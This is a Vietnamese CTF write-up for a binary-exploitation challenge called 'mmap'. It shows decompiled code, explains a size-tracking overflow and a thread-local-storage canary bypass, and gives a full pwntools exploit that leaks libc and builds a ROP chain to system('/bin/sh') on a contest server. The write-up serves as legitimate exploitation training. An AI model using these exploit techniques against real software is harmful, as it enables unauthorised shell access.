# mmap

Đây là challenge cũng không khó trong kì thi, tuy nhiên để giải nó bạn cần kiến thức về `thread local storage` và một chút trick để giải được :))

## Checksec

Full protection 

![image](https://user-images.githubusercontent.com/57558487/196599738-93c5f831-f068-43b5-a5b5-b7cebf3fdb7e.png)

## Reverse

Bài này có flow của một bài heap rất quen thuộc, bao gồm `create()`, `edit()`, `show()` và `delete()`. sự khác biệt ở đây là họ không dùng `malloc` mà dùng `mmap`

### Hàm `main()`
while loop với 4 option

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // [rsp+1Ch] [rbp-4h]

  setupbuf(argc, argv, envp);
  while ( 1 )
  {
    menu();
    v3 = readchoice(argc);
    if ( !v3 )
      break;
    if ( v3 == 4 )
    {
      delete(argc);
    }
    else
    {
      if ( v3 > 4 )
      {
        puts("Invalid choice. Exiting!");
        exit(1);
      }
      if ( v3 == 3 )
      {
        show(argc);
      }
      else if ( v3 == 1 )
      {
        add(argc);
      }
      else
      {
        edit(argc);
      }
    }
  }
  _exit(0);
}
```

### Hàm `readchoice`

```c
unsigned __int64 readchoice()
{
  char nptr[8]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v2; // [rsp+8h] [rbp-18h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  *(_QWORD *)nptr = 0LL;
  v2 = 0LL;
  printf("Your choice : ");
  __isoc99_scanf("%s", nptr);
  return strtoul(nptr, 0LL, 10);
}
```

Có lỗi buffer overflow `scanf("%s")`. Tuy nhiên vì chương trình bật cả `canary` và `PIE`, chúng ta cần leak một một địa chỉ và giá trị của `canary` để có thể attack

### Hàm `add` 

```c
int add()
{
  unsigned int v1; // ebx
  unsigned int v2[3]; // [rsp+Ch] [rbp-14h] BYREF

  v2[0] = 0;
  printf("Index: ");
  __isoc99_scanf("%u%*c", v2);
  if ( v2[0] > 0xF )
    return puts("Invalid index!");
  printf("Size: ");
  __isoc99_scanf("%u%*c", &gSize[v2[0]]);
  if ( !gSize[v2[0]] )
    return puts("Empty note. Try again later.");
  if ( gSize[v2[0]] > 0x2000 )
    return puts("Why your note take so much space? Add another one...");
  v1 = v2[0];
  qword_4090[4 * v1] = mmap(0LL, gSize[v2[0]], 3, 34, 0, 0LL);
  if ( qword_4090[4 * v1] == -1LL )
  {
    puts("Somehow mmap failed. WTF!");
    exit(0);
  }
  printf("Write something to your note: ");
  readline(qword_4090[4 * v2[0]], gSize[v2[0]]);
  generate_name(v2[0]);
  return printf("Your note has an unique name: %s\n", (const char *)&gNotes + 32 * v2[0]);
}
```

Mình rất thường hay phân tích hàm `add` khi vào các bài heap trước. Vì nó sẽ cho chúng ta cái nhìn tổng quát về cấu trúc dữ liệu mà chương trình dùng.
Ở đây cấu trúc dữ liệu  chương trình sẽ như sau:

![image](https://user-images.githubusercontent.com/57558487/196600775-a337ac7b-4ecf-4edb-a82d-27272bcab8d5.png)

Chương trình có một mảng `gNotes` chứa tối đa 16 node. Struct node có size 0x20, và 0x10 byte đầu dùng để chưa `name` được generate ngẫu nhiên mỗi khi tạo node, qword tiếp theo chưa pointer đến vùng được cấp phát bởi `mmap()` với maxsize là 0x2000. Các vùng nhớ mmap sẽ có permission là read/write. Và một mảng `gSize` dùng để chứa độ dài của vùng mmap của mỗi node dùng để thao tác ở các hàm sau: `edit`, `delete`. Một symbols là `qword_4090` được ida tạo ra để tính toán offset đến các pointer trong một struct thôi, để các bạn khỏi nhầm lẫn :v.

Và nếu bạn tinh ý hay có chút kinh nghiệm, dễ dàng nhận ra được bug trong hàm này, đó là nếu như ta nhập một giá trị > 0x2000 vào `gSize` của một node. Hàm sẽ thoát ngay nhưng vẫn lưu giá trị đó ở trong `gSize`, tức là nếu trong các hàm khác có sử dụng giá trị `gSize` này để thao tác với các node. ta có thể lợi dụng sửa size của một note bất kì để tạo ra lỗi buffer overflow.

Flow như sau: `add(0, 0x2000)` -> `add(0, 0x5000)` sẽ tạo ra node ở index 0 với size thật là 0x2000 và size ở `gSize` là 0x5000. Lúc này ta có thể lợi dụng các hàm phía sau như `edit` hay `delete` để tấn công buffer overflow.

### Hàm `edit`

```c
int edit()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h] BYREF

  v1 = 0;
  printf("Index: ");
  __isoc99_scanf("%u%*c", &v1);
  if ( v1 > 0xF )
    return puts("Invalid index!");
  if ( !qword_4090[4 * v1] || !gSize[v1] )
    return puts("This note is empty.");
  printf("Write your new note: ");
  readline(qword_4090[4 * v1], gSize[v1]);
  return puts("Done!");
}
```

Hàm edit dựa vào pointer ở mỗi struct và `gSize` ở struct đó để gọi lại hàm `readline()` nhập input vào. ta có thể confirm lỗi buffer overflow nếu kết hợp với lỗi ở hàm `add` phía trên.

### Hàm `readline`

```c
__int64 __fastcall readline(__int64 a1, unsigned int a2)
{
  __int64 result; // rax
  int v3; // eax
  unsigned __int8 buf; // [rsp+1Bh] [rbp-5h] BYREF
  unsigned int v5; // [rsp+1Ch] [rbp-4h]

  buf = 0;
  v5 = 0;
  while ( 1 )
  {
    result = v5;
    if ( v5 >= a2 )
      break;
    read(0, &buf, 1uLL);
    result = buf;
    if ( buf == 10 )
      break;
    v3 = v5++;
    *(_BYTE *)(a1 + v3) = buf;
  }
  return result;
}
```

Hàm này đơn giản là gọi `read` từng byte một cho đến khi đủ số lượng hoặc gặp byte '\n', lúc đấy hàm sẽ thay byte '\n' bằng '\x00', ta cần lưu ý điều này, nếu ta không muốn chuỗi ta nhập kết thúc bằng NULL byte, ta cần điều chỉnh chính xác độ dài của mảng.

### Hàm `show`

```c
int show()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned int i; // [rsp+8h] [rbp-8h]
  int v3; // [rsp+Ch] [rbp-4h]

  v1 = 0;
  v3 = 0;
  puts("These are the notes you have created so far:");
  for ( i = 0; (int)i <= 15; ++i )
  {
    if ( qword_4090[4 * (int)i] )
    {
      printf("%d. %s\n", i, (const char *)&gNotes + 32 * (int)i);
      v3 = 1;
    }
  }
  if ( !v3 )
    return puts("No note found!");
  printf("Which one to open? ");
  __isoc99_scanf("%u%*c", &v1);
  if ( v1 > 0xF )
    return puts("Invalid index!");
  if ( qword_4090[4 * v1] && gSize[v1] )
    return printf("Content of note %s:\n%s", (const char *)&gNotes + 32 * v1, (const char *)qword_4090[4 * v1]);
  return puts("This note is empty.");
}
```

Hàm show đơn giản là in ra giá trị của `name` và `buffer` ta chọn, chú ý hàm sử dụng `printf("%s")`, tức là chuỗi sẽ kết thúc nếu gặp NULL byte trong mảng.

### Hàm `delete`

```c
int delete()
{
  unsigned int *v0; // rax
  unsigned int v2; // [rsp+Ch] [rbp-4h] BYREF

  v2 = 0;
  printf("Index: ");
  __isoc99_scanf("%u%*c", &v2);
  if ( v2 <= 0xF )
  {
    if ( *((_QWORD *)&qword_4090 + 4 * v2) && gSize[v2] )
    {
      munmap(*((void **)&qword_4090 + 4 * v2), gSize[v2]);
      memset((char *)&gNotes + 32 * v2, 0, 0x20uLL);
      v0 = gSize;
      gSize[v2] = 0;
    }
    else
    {
      LODWORD(v0) = puts("This note is empty.");
    }
  }
  else
  {
    LODWORD(v0) = puts("Invalid index!");
  }
  return (int)v0;
}
```

Hàm này không có lỗi gì đặc biệt, nếu kết hợp với lỗi ở hàm `add`, ta có thể `munmap` một mảng lớn hơn độ dài mảng thật, từ đó có thể overlap chunk hay làm gì gì đó, tuy nhiên mình chưa nghĩ ra hướng nào để exploit sử dụng hàm này, và trong cách làm của mình cũng không có dùng đến hàm này.

## Thinking

Sau khi phân tích kĩ các điều trên, với việc target của mình là leak được một địa chỉ và `canary`, mình nghĩ ngay đến `thread local storage (tls)`

### tls section

Các bạn có thể search gg để hiểu thêm nhé, mình chỉ tóm tắt một vài ý chính. `tls` section chứa thông tin về một thread đang chạy trong chương trình, mỗi thread (kể cả main thread) đều có một vùng `tls` trên memory, và với các libc mới mình quen thuộc thì nó luôn nằm ngay phía trên vùng nhớ dành cho `libc`. Từ đó nếu ta leak được một offset thuộc `tls`, ta có thể tìm được libc address và ngược lại. 

Ở trên `tls`, các target phổ biến nhất mình hay nghĩ đến là `canary`, nằm ở offset `fs:0x28`, các bạn có thể dùng gdb và type `x/10xg $fs_base` để tìm ra vùng nhớ ở `tls section`

![image](https://user-images.githubusercontent.com/57558487/196603277-096c5eab-c364-49c1-ab14-7cbbffdcfa1a.png)

Một lí do nữa mình nghĩ đến `tls` đó là vì mình đã có kinh nghiệm gặp một vài bài tương tự, và đọc ở link [này](https://github.com/Naetw/CTF-pwn-tips) mình biết rằng nếu `malloc(0x21000)` thì chương trình sẽ gọi hàm `mmap()` và cấp cho một chunk nằm ngay trên nó.

### Allocate and get the offset

Tuy nhiên vấn đề ở đây là maxsize ta có thể `mmap` là 0x2000, nhỏ hơn rất nhiều, và khi mình chạy thử thì nó cấp ở phân vùng nằm giữa ld chứ không phải ở trên `tls`. Tuy nhiên mình đoán là nếu ta `mmap` đủ số lần và lấp hết khoảng cách giữa 2 ld. Vùng nhớ tiếp theo cấp phát sẽ nằm ngay trên `tls` như ta cần.

```python
create(1, 0x2000, b'A\n')
create(0, 0x2000, b'A\n')
```

Kết quả là: 

![image](https://user-images.githubusercontent.com/57558487/196605709-643f0e9e-dedd-4916-9aef-acd322dfff38.png)

Ta có được một vùng nhớ với offset đến `$fs_base` là 0x4740, tuyệt vì ta có thể dùng nó để tấn công tiếp theo.

### Leaking and Fixxing bug

Vì chúng ta cần leak một địa chỉ và `canary`, nên ở đây mình chọn leak địa chỉ ở ngay vị trí `$fs_base` và đè qua `canary` để bypass. Tại ngay vị trí `$fs_base` có giá trị trả về chính nó, từ đây ta có thể tính toán được libc address. Như đã phân tích ở trên, ta cần thay `gSize[0] = 0x4070` chính xác để không bị gián đoạn bởi NULL byte.

Thử:

```python
create(1, 0x2000, b'A\n')
create(0, 0x2000, b'A\n')

show(0)
create(0, 0x4740)
edit(0, b'A' * 0x4740)
show(0)

s.recvuntil(b':\n')
d = s.recvuntil(b'A' * 0x4740)

leak = int.from_bytes(s.recv(6), byteorder = 'little', signed = False)
log.info('Leak: 0x%x', leak)
```

Bùm, vả crash ....

![image](https://user-images.githubusercontent.com/57558487/196610990-cb1f0d6f-dfe3-440e-a0cb-5f8e4527ac4b.png)

Mình kì vọng nó sẽ in ra giá trị tại `$fs_base`, tuy nhiên chương trình lại crash, dùng gdb để kiểm tra, ta có thể thấy chương trình crash tại `__vfscanf_internal+75`, lí do crash là vì chương trình đã cố đọc giá trị tại vùng nhớ [0x4141414141414141], một vùng nhớ không tồn tại.

-> Ok, dễ dàng nhận ra 0x4141414141414141 chính là chuỗi 'AAAAAAAA' ta đã đè vào đó, vậy tức là trong quá trình đè đến `$fs_base`, ta đã đè lên một vùng nhớ nào đó và khiến chương trình lỗi, ta cần xác định xem đâu là giá trị đầu tiên mà ta không thẻ overwrite trong khoảng cách từ mảng đến `$fs_base`.

![image](https://user-images.githubusercontent.com/57558487/196612490-b173805e-f71c-4e3d-8485-7ac33008aa2a.png)

Mình tiến hành dump và kiểm tra các giá trị ở gần phân vùng `$fs_base`, cuối cùng mình tìm thấy giá trị tại offset 0x46b0 chứa một địa chỉ nằm trong phần vùng `libc` -> ta có thể tính địa chỉ libc từ giá trị này.

Chỉnh sửa lại payload một chút, điều chỉnh target thành offset 0x46b0, mình có thể leak thành công mà chương trình vẫn chạy bth -> it really good.

```python
create(1, 0x2000, b'A\n')
create(0, 0x2000, b'A\n')

show(0)
create(0, 0x46b0)
edit(0, b'A' * 0x46b0)
show(0)

s.recvuntil(b':\n')
d = s.recvuntil(b'A' * 0x46b0)

leak = int.from_bytes(s.recv(6), byteorder = 'little', signed = False)
libc.address = leak - offset
log.info('Leak: 0x%x', leak)
log.info('Libc base: 0x%x', libc.address)
```

![image](https://user-images.githubusercontent.com/57558487/196613308-b0d90930-8efc-4c4c-b61c-2e6b8102353a.png)

Vậy mình đã có thể leak được địa chỉ libc thành công, mình chỉ cần một bước cuối nữa là bypass `canary` để có thể tấn công, không thể leak được `canary` vì `printf` sẽ dừng lại tại NULL byte (offset 0x46b0), vì thế mình tiến hành đè qua `canary` bằng 0 để bypass.

Rứt kinh nghiệm, trong quá trình đè mình sẽ cố gắng ít thay đổi nhất có thể để chương trình không bị crash. May mắn là tất cả các giá trị từ mảng đến `canary` đều có thể tính toán tương đổi dựa vào giá trị biến `leak` ta có được.

```python
create(0, 0x4770)

payload = b'A' * 0x46b0 + p64(leak)

val = [0x7dc0, 0, -0x5c0c0, -0x5bac0, -0x5b1c0] 
val2 = [-0x21ce40, -0x21c420, -0x21ce40, 0, 0]

for i in val:
	if i:
		payload += p64(leak + i)
	else:
		payload += p64(0)

for i in range(12):
	payload += p64(0)

for i in val2:
	if i:
		payload += p64(leak + i)
	else:
		payload += p64(0)

payload += p64(0) # overwrite canary

assert(len(payload) == 0x4770)
assert(b'\x20' not in payload)
assert(b'\n' not in payload)

edit(0, payload)
```

Okay, tiếp theo là tạo payload ROP bằng các gadget trong `libc` do đã tính toán được libc address

```python
rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address

payload = b'1' + b'\x00' * 7 + p64(0) * 4 + p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
s.sendlineafter(b'Your choice : ', payload)

s.interactive()
```

Chạy thử và nó đã chạy thành công trên local.

![image](https://user-images.githubusercontent.com/57558487/196614760-1061d1b9-b1b9-4d90-8db0-a60adcb435ca.png)

### Edit payload to work with server side

Khi giải thành công trên local thì mình hí hửng đem lên chạy server ngay. Nghĩ bụng là có được flag ngon cơm rồi. Tuy nhiên mình lại gặp thêm một rắc rối nữa.

Số lượng `mmap(0x2000)` cần trước khi tạo được chunk nằm trước `tls` trên server là khác nhau. Mặc dù tác giả cho cả `libc` lẫn `ld`, vẫn có sự khác biệt khi chạy trên máy mình và chạy trên server. Trên máy mình cần tạo 2 chunk để có được offset như phía trên, trên server thì cần nhiều hơn. Lúc này mình lục lại đề và dùng docker ubuntu 22 chạy thử và tìm offset, tuy nhiên vẫn không chính xác, cuối cùng mình đã dùng một trick khác là brute đến khi nào đúng offset :)))

Mình edit lại code như sau:

```python
t, n = 0, 1

while True:
	try: 
		s = conn()

		print(n)

		for i in range(n):
			create(10, 0x2000, b'A\n')
		create(0, 0x2000, b'A\n')

		if t == 3:
			n += 1
			t = 0
		else:
			t += 1

		# exploit code

		break

	except KeyboardInterrupt:
		s.close()
		exit(0)
	except:
		s.close()

s.interactive()
```

Vì điều kiện mạng khá tệ nên mình quyết định thử mỗi giá trị 3 lần, đến khi n == 3, thì server trả về thành công :)))

## Exploit

```python
#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./chall_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				b*show
				b*edit+233
				b*system
			''' + 'c\n' * 1)
		else:
			raw_input('DEBUG')
	else:
		s = remote('34.143.130.87', 4096)

	return s

s = conn()

elf = ELF('./chall_patched')
libc = ELF('libc.so.6')

offset = 0x21a580

def create(index, size, data = None):
	s.sendlineafter(b'Your choice : ', b'1')
	s.sendlineafter(b'Index: ', str(index).encode())
	s.sendlineafter(b'Size: ', str(size).encode())
	if data:
		s.sendafter(b'Write something to your note: ', data)

def edit(index, data):
	s.sendlineafter(b'Your choice : ', b'2')
	s.sendlineafter(b'Index: ', str(index).encode())
	s.sendafter(b'Write your new note: ', data)


def show(index):
	s.sendlineafter(b'Your choice : ', b'3')
	s.sendlineafter(b'Which one to open? ', str(index).encode())

def dump(offset):
	payload = b''
	for i in range(0x2000, offset, 8):
		create(0, i)
		edit(0, b'A' * 0x2000)

for i in range(3):
	create(10, 0x2000, b'A\n')
create(0, 0x2000, b'A\n')
show(0)
create(0, 0x46b0)
edit(0, b'A' * 0x46b0)
show(0)

s.recvuntil(b':\n')
d = s.recvuntil(b'A' * 0x46b0)

print(hex(len(d)))
# print(s.recv())

leak = int.from_bytes(s.recv(6), byteorder = 'little', signed = False)
libc.address = leak - offset
canary_addr = leak - 0x21ce20
usefull = libc.address - 0x9000
log.info('Leak: 0x%x', leak)
log.info('Libc base: 0x%x', libc.address)
log.info('Canary address: 0x%x', canary_addr)

create(0, 0x4770)

payload = b'A' * 0x46b0 + p64(leak)

val = [0x7dc0, 0, -0x5c0c0, -0x5bac0, -0x5b1c0] 
val2 = [-0x21ce40, -0x21c420, -0x21ce40, 0, 0]

for i in val:
	if i:
		payload += p64(leak + i)
	else:
		payload += p64(0)

for i in range(12):
	payload += p64(0)

for i in val2:
	if i:
		payload += p64(leak + i)
	else:
		payload += p64(0)

payload += p64(0)

assert(len(payload) == 0x4770)
assert(b'\x20' not in payload)
assert(b'\n' not in payload)

edit(0, payload)

rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address

payload = b'1' + b'\x00' * 7 + p64(0) * 4 + p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
s.sendlineafter(b'Your choice : ', payload)

s.interactive()
```

Flag: Bài này mình quên lưu lại flag rồi, và lúc mình viết writeup này thì server cũng đóng mất tiêu :))

